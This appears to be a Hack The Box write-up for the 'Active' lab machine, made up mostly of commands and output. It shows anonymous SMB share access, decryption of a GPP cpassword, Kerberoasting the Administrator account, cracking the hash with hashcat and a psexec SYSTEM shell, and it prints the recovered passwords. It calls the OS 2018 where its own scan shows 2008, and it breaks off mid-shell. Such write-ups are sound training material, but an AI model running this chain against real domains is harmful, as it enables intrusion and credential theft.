---
title: HTB-Active Writeup
date: 2026-04-14T08:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
## Initial Reconnaissace

### Nmap Port Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]                                                     
└─$ sudo nmap --min-rate 10000 -p- 10.129.18.244 -oA ports                                                                                                                          
[sudo] password for kali:                                                                                                                                                           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 20:56 -0400                                                                                                                   
Warning: 10.129.18.244 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.18.244
Host is up (0.12s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE    SERVICE
53/tcp    open     domain
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
1139/tcp  filtered cce3x
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5722/tcp  open     msdfsr
9389/tcp  open     adws
10489/tcp filtered unknown
28021/tcp filtered unknown
32539/tcp filtered unknown
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49157/tcp open     unknown
49158/tcp open     unknown
49165/tcp open     unknown
49170/tcp open     unknown
49173/tcp open     unknown
56367/tcp filtered unknown
57964/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds
```

Extracting the ports for later use。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ grep open ports.nmap | awk -F '/' '{print $1}' | paste -sd ',' 
53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49173

```

### Nmap Detailed Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49173 10.129.18.244
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 20:58 -0400
Nmap scan report for 10.129.18.244
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-14T00:59:45
|_  start_date: 2026-04-14T00:34:20
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.35 seconds
```

According to the Nmap scan results, the target machine is running `Windows Server 2018 R2SP1` and is a domain controller, name is `active.htb`, and the hostname is `DC`.

Adding the domain name to the `hosts` file.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ sudo bash -c 'echo "10.129.18.244 active.htb" >> /etc/hosts'                                                           
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ tail -n 1 /etc/hosts
10.129.18.244 active.htb

```

## SMB Exploitation

Machine has ports 139 and 445 open, indicating SMB services. Executing `smbmap` scan.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]                                                                                                                                                              
└─$ smbmap -H active.htb                                                                                                                                                                          
                                                                                                                                                                                                  
    ________  ___      ___  _______   ___      ___       __         _______                                                                                                                       
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\                                                                                                                      
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)                                                                                                                     
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/                                                                                                                      
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /                                                                                                                          
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \                                                                                                                         
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)                                                                                                                        
-----------------------------------------------------------------------------                                                                                                                     
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com                                                                                                                     
                     https://github.com/ShawnDEvans/smbmap                                                                                                                                        
                                                                                                                                                                                                  
[*] Detected 1 hosts serving SMB                                                                                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                                                                                               
                                                                                                                                                                                                  
[+] IP: 10.129.18.244:445       Name: active.htb                Status: Authenticated                                                                                                             
        Disk                                                    Permissions     Comment                                                                                                           
        ----                                                    -----------     -------                                                                                                           
        ADMIN$                                                  NO ACCESS       Remote Admin                                                                                                      
        C$                                                      NO ACCESS       Default share                                                                                                     
        IPC$                                                    NO ACCESS       Remote IPC                                                                                                        
        NETLOGON                                                NO ACCESS       Logon server share                                                                                                
        Replication                                             READ ONLY                                                                                                                         
        SYSVOL                                                  NO ACCESS       Logon server share                                                                                                
        Users                                                   NO ACCESS                                                                                                                         
[*] Closed 1 connections 
```

Discovered a `READ ONLY` shared directory named `Replication`, Using `smbclient` recheck.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ smbclient -L active.htb -N 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to active.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Connecting to `Replication`, downloading all its files to Kali.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active/Smb]
└─$ smbclient //active.htb/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt off
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (6.0 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.1 KiloBytes/sec) (average 1.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.3 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (8.0 KiloBytes/sec) (average 2.5 KiloBytes/sec)
smb: \> ^C
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Active/Smb]
└─$ ls
active.htb
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Active/Smb]
└─$ cd active.htb 
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Kali/Active/Smb/active.htb]
└─$ ls
DfsrPrivate  Policies  scripts
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Kali/Active/Smb/active.htb]
└─$ tree                
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files

```

Browsing the files reveals valuable information within `Groups.xml`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active/Smb]
└─$ cd active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/ 
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ ls                    
Groups.xml
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat Groups.xml                                                                             
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

Found a user credential：
`active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

Searching to see what kind of encryption method this is。

![](Pasted%20image%2020260414185018.png)

This is GPP encrypthion.Using `gpp-decrypt` to decrypt it, get the password for `SVC_TGS`, which is `GPPstillStandingStrong2k18`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

## Obtaining the User flag

Using account `SVC_TGS` to enumerate SMB, discovered the directory `Users`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ smbmap -H 10.129.18.244 -u SVC_TGS -d active.htb -p 'GPPstillStandingStrong2k18' 
                                                                                                                                                                                                  
    ________  ___      ___  _______   ___      ___       __         _______                                                                                                                       
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\                                                                                                                      
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)                                                                                                                     
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/                                                                                                                      
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /                                                                                                                          
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \                                                                                                                         
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)  
   
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com             
                     https://github.com/ShawnDEvans/smbmap
[*] Detected 1 hosts serving SMB                                                          
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                       
                                                                                          
[+] IP: 10.129.18.244:445       Name: active.htb                Status: Authenticated   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------   
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY                                                                                                           
        SYSVOL                                                  READ ONLY       Logon server share                                                                    
        Users                                                   READ ONLY       
[*] Closed 1 connections
```

Found `user.txt` inside `Users`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ smbclient //active.htb/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                10459647 blocks of size 4096. 5202540 blocks available
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
cd
                10459647 blocks of size 4096. 5202540 blocks available
smb: \> cd SVC_TGS
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018
cd Des
                10459647 blocks of size 4096. 5202540 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Mon Apr 13 20:35:17 2026

                10459647 blocks of size 4096. 5202540 blocks available
smb: \SVC_TGS\Desktop\> mget user.txt
Get file user.txt? y
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ cat user.txt  
4def5a4b**********609a8c31b0
```

## Obstaining  Administrator Access

Using `GetUserSPNs` to enumerate domain users with registered SPNS,found `Administrator`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.18.244 -request  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-04-13 20:35:21.997740             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4
 
```

Save is as `admin.hash`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ vim admin.hash          
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ cat admin.hash 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4
 
```

Using `hashcat` to crack the hash,obstained the password `Ticketmaster1968`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27824 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...3945e4
Time.Started.....: Tue Apr 14 07:52:49 2026 (4 secs)
Time.Estimated...: Tue Apr 14 07:52:53 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2887.5 kH/s (1.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Teague51
Hardware.Mon.#01.: Util: 53%

Started: Tue Apr 14 07:52:37 2026
Stopped: Tue Apr 14 07:52:53 2026
```

Using `psexec` to login as `Administator`，successfully obtained `root.txt`.

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.18.244                                                                                                                                                                               
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.18.244.....
[*] Found writable share ADMIN$
[*] Uploading file TzDfNSsq.exe
[*] Opening SVCManager on 10.129.18.244.....
[*] Creating service CVyF on 10.129.18.244.....
[*] Starting service CVyF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.18.244
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

C:\Windows\system32> cd c:\Users

c:\Users> ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 2AF3-72E4

